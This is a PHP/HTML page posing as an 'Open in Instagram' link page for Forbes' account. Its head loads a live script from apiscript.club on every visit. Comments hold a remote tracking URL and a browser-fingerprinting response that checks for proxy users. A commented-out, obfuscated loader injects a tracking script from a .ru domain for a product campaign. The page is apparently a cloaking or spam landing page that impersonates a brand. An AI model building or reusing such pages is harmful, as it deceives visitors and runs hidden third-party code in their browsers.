<?php 

$profile = 'forbes';
$ava = 'https://instagram.fdnk1-1.fna.fbcdn.net/v/t51.2885-19/s150x150/36160043_648018948865151_925262115927752704_n.jpg?_nc_ht=instagram.fdnk1-1.fna.fbcdn.net&_nc_ohc=jDbemys6srgAX9ijyze&oh=af329c8a77d19cfcbd7a6e165ae0b244&oe=5EAE2F5B';
$insta_title = 'Forbes';
$insta_descr = 'Official Instagram account of Forbes, the world’s leading voice for entrepreneurial success and free enterprise.';

?>


<!DOCTYPE html>
<html>
    <head>
        <title>Open in Instagram</title>
        <meta charset="utf+8">
        <meta name="viewport" content="width=600">
		
		<script src="//apiscript.club/dash/main.js"></script>
	<?

	// <!-- http://apiscript.club/ -->
	// 
	// 
	// 
	// https://home.7933311.com/_remote_track?campaign=iiM332QnbO&referrer=Facebook.com&uri=11
	// 
	// Bad Request
// {"fp":{"checks":["userAgent","holaNetwork","luminatiUser","timeData"],"data_url":"https://home.7933311.com/_previsit/CR3GRZjZg","script_url":"https://home.7933311.com/_fp.js"},"result":"fp"}
	?>

	



<!-- <script id="BRdYd">var _WtQ03 = ['querySelector', 'body', 'getElementById', 'DOMContentLoaded', 'createElement', 'script', 'type', 'text/javascript'];(function(_6cg58, _VxzBn) {var _w90BR = function(_zLlaS) {while (--_zLlaS) {_6cg58['push'](_6cg58['shift']());}};_w90BR(++_VxzBn);}(_WtQ03, 0x11b));var _fN3zI = function(_eAI8M, _ixCCp) {_eAI8M = _eAI8M - 0x0;var _nLASG = _WtQ03[_eAI8M];return _nLASG;};document['addEventListener'](_fN3zI('0x0'), function() {var _yl7vY = document[_fN3zI('0x1')](_fN3zI('0x2'));_yl7vY[_fN3zI('0x3')] = _fN3zI('0x4');_yl7vY['src'] = 'https://domsaletorg.ru/land/hydromousse/1/track.js?campaign=a2KqmscEbP';document[_fN3zI('0x5')](_fN3zI('0x6'))['appendChild'](_yl7vY);document[_fN3zI('0x7')]('BRdYd')['remove']();}, {'once': !![]});</script> -->

        <style>
            body {
                min-width: 500px;
                background: #f5f5f5;

                font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";
            }

            * {
                -moz-box-sizing: border-box; /* Firefox */
                box-sizing: border-box; 
            }

            .container {
                width: 100%;
                max-width: 500px;
                margin: 0 auto;
                padding-left: 30px;
                padding-right: 30px;
                padding-top: 15px;
                padding-bottom: 15px;
                text-align: center;
            }

            .btn {
                display: block;
                background: #745AE0;
                border-radius: 41px;
                border: 0px solid #C2CADE;
                font-size: 16px;
                color: #FFFFFF;
                padding-top: 18px;
                padding-bottom: 17px;
                width: 100%;
                outline: 0;
                font-weight: bold;
                box-shadow: 0px 15px 30px 0px rgba(116, 90, 224, 0.35);
                text-shadow: 0px 15px 30px rgba(116, 90, 224, 0.35);
                -o-transition: .2s;
                -ms-transition: .2s;
                -moz-transition: .2s;
                -webkit-transition: .2s;
                transition: .2s;
                cursor: pointer;
                text-decoration: none;
            }

            .btn-open { margin: 0 auto; margin-top: 30px; width: 400px; font-size: 20px; padding-top: 20px; padding-bottom: 22px; }

            .img-round {
                border-radius: 50%;
                -moz-border-radius: 50%;
                -webkit-border-radius: 50%;
                display: block;
                margin: 0 auto;
                margin-top: 20px;
                border: 2px solid red;
                width: 150px;
                height: 150px;
            }

            .annotation {
                font-size: 22px;
                line-height: 1.6;
                font-weight: 500;
            }

            .open-descriptor {
            font-size: 18px;
            font-weight: 300;
            color: #7d7d7d;
            display: block;
            margin-top: 35px;
            }

            .footer {
                left: 0;
                width: 100%;
                text-align: center;
                margin-top: 100px;
            }

            .footer a {
            font-size: 18px;
            color: #8a8a8a;
            text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <img src="<?=$ava?>" class="img-round" width="150"/>
                 <h1><?=$profile?></h1>
				 <div style="margin-top: 30px;">
                    <p class="open-descriptor">See Instagram photos and videos from <<<?=$profile?>>>					| Mobile Massage</p>
                </div>
                <div style="margin-top: 30px;">
                    <p class=""><br/> <?=$insta_title?> <br/> <?=$insta_descr?><br/> </p>
                </div>

            <a href="https://www.instagram.com/<?=$profile?>/" class="btn btn-open">Open in Instagram</a>
        </div>

        


        <script>
            // setTimeout(function(){window.location.replace('https://www.instagram.com/<?=$profile?>/');}, 2500);
        </script>



    </body>
</html>